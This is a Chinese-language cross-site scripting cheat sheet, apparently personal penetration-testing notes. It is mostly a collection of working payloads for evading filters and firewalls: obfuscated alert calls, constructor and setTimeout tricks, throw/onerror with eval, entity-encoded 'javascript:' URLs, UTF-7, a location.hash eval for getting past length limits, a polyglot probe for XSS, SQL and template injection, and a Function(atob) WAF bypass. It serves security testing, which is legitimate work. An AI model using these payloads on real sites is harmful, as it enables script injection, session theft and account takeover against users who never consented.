### XSS的本质是HTML注入

alert prompt confirm

#### [content-type-research](https://github.com/BlackFan/content-type-research)

#### FUZZ标签事件用[备忘单](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)就够了，下面的是~~求精~~（为了水个弹窗洞）。

-   各种执行方式，可拼接在事件的

```
window['alert'](0)
top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);
parent['alert'](1)
self['alert'](2)
top['alert'](3)
frames['alert'](5)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
[].filter.constructor('ale'+'rt(13)')();
constructor.constructor("aler"+"t(14)")();
location='javascript:ale'+'rt(2)';
setTimeout`alert\u00287\u0029`;
setTimeout('ale'+'rt(3)');
setInterval('ale'+'rt(4)');
Set.constructor('ale'+'rt(5)')();
```

-   XSS突破长度限制：可以将 反射型 XSS 漏洞“转换成”基于 DOM 的 XSS 漏洞

```
例如，如果易受攻击的参数称为 vuln 则可以使用以下 URL 执行任意长度的脚本：
/script.asp?vuln=<script>eval_r(location.hash.substr(1))</script>#alert('long script here ......')
```

-   自定义html标签

```
<xss id=x onfocus=print(/test/) tabindex=0> 按下Tab键触发，但要是在URL中写，可以直接用#x来聚焦
```

-   检测XSS、SQL、模板注入

```
'"><svg/onload=prompt(5);>{{7*7}}
```

-   UTF-7（IE可用）

```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

-   在事件属性中的HTML编码会自动HTML解码

```
<a href="#" onclick="var a = 'foo&apos;; alert(1);//';">Click</a>
```

-   括号被过滤,可以使用throw来抛出数据

```
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';>
```

-   DOM型挖掘，多看页面中的js脚本代码。最好用img和svg标签。关注如下方法：

```
innerHTML 
document.write
document.writeln
document.location
document.url
```

-   编码demo：

```
<a href="javas&Tab;cript:alert(1)"> 同 <a href="javas&#09;cript:alert(1)"> 同
<a href="j&#13;a&#13;v&#13;as&#13;cr&#13;ipt&#13;:&#13;aler&#13;t&#13;(&#13;1)">  # &#13;为换行，随便插。同样可用的还有&#10;,&NewLine;,&colon;,&rpar;,&lpar;
<img onerror=eval('al&#x5c;\u0065rt(1)') src=a>
<script>'alert(1)'.replace(/.+/,eval);</script>
<img onerror="a&#0108ert(1)"src=a>
<img/onerror="a&#x6c;ert(1)"src=a>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29;>
```

#### [针对特殊Waf的绕过思路](https://www.t00ls.com/articles-66020.html)

文中提到了Function、atob、反引号的使用技巧，达到了如下图的效果：
![image](https://user-images.githubusercontent.com/68197734/177947667-6ec03338-fdc3-4d0c-9933-f48095ef398b.png)
<script>Function(atob`YWxlcnQoInhzcyIp`)()</script>
总结来说就是：
- 用Function()代替eval()
- atob解密base64加密的JS
- 反引号代替括号与引号
